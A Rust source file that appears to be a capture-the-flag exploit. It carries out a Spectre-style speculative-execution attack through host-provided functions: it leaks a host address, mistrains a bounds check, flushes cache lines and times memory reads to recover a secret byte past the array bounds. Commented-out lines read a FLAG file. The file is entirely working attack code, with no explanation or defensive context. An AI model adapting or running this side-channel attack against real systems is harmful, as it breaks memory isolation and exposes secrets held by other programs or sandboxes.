#![allow(dead_code)]
#![allow(unused_assignments)]
#![allow(unused_mut)]
#![allow(unused_variables)]

static ARRAY1_SIZE: usize = 16;
// static CACHE_HIT_THRESHOLD: usize = 80;
static CACHE_HIT_THRESHOLD: usize = 500;

extern {
    fn get_host_info() -> i64;
    fn get_data_size() -> i64;
    fn get_data3() -> i64;
    fn get_data5() -> i64;
    fn debug_flush(addr: i64);
    fn debug_ts() -> u64;
    fn check_data(offset: i32);
    fn debug_read(addr: i64);
}

fn main() {}

#[no_mangle]
pub fn this_is_what_ive_got() -> i32 {
    // use std::fs::File;
    // use std::io::Read;
    // let mut flag = String::new();
    // File::open("./FLAG").expect("open").read_to_string(&mut flag).expect("read");
    // eprintln!("{}", flag);

    unsafe { 
        let leaked_addr = get_host_info();
        // eprintln!("leaked: {:x}", leaked_addr);
        read_byte(leaked_addr & 0x0fffffff00000000, 256) as i32
    }
}

unsafe fn read_byte(addr_prefix: i64, target_offset: isize) -> u8 {
    let mut j = -1isize;
    let mut k = -1isize;
    let mut results = [0u8; 256];
    let array1_size_ptr = get_data_size() as *const i32;
    let array1 = get_data3() as *const u8;
    let array2 = get_data5() as *const u8;

    // eprintln!("array1_size={:#?} array1={:#?} array2={:#?}", array1_size_ptr, array1, array2);
    // eprintln!("array1_size={:x} array1={:x} array2={:x}", get_array1_size_ptr(), get_data3(), get_data5());

    for tries in (0..1000).rev() {
        for i in 0..256 {
            debug_flush((array2.offset(i * 512) as i64) | addr_prefix);
        }

        let mut training_offset = (tries % ARRAY1_SIZE) as isize;
        for j in (0..30).rev() {
            debug_flush((array1_size_ptr as i64) | addr_prefix);
            for _ in 0..100 {
            }

            let mut offset = ((j % 6) - 1) & !0xffff;
            offset = offset | (offset >> 16);
            offset = training_offset ^ (offset & (target_offset ^ training_offset));
            // eprintln!("offset={}", offset);
            eprint!(".");
            check_data(offset as i32);
        }

        eprintln!("");

        for i in 0..256 {
            let mix_index = ((i * 167) + 13) & 255;
            let addr = array2.offset(mix_index * 512);
            let start = debug_ts();
            let tmp = debug_read((addr as i64) | addr_prefix);
            let elapsed = debug_ts() - start;
            // TODO: Check if additional conditional is actually necessary
            // eprintln!("{:02x}: elapsed={}", mix_index, elapsed);
            if (elapsed as usize) < CACHE_HIT_THRESHOLD {
                results[mix_index as usize] += 1;
            }
        }

        j = -1isize;
        k = -1isize;
        for i in 0..256 {
            if j < 0 || results[j as usize] < results[i] {
                k = j;
                j = i as isize;
            } else if k < 0 || results[k as usize] < results[i] {
                k = i as isize;
            }
        }

        if results[j as usize] >= (2 * results[k as usize])
            || (results[j as usize] == 2 && results[k as usize] == 0) {
            break;
        }
    }

    // for (i, x) in results.iter().enumerate() {
    //     eprintln!("{:02x}: {}", i, x);
    // }

    j as u8
}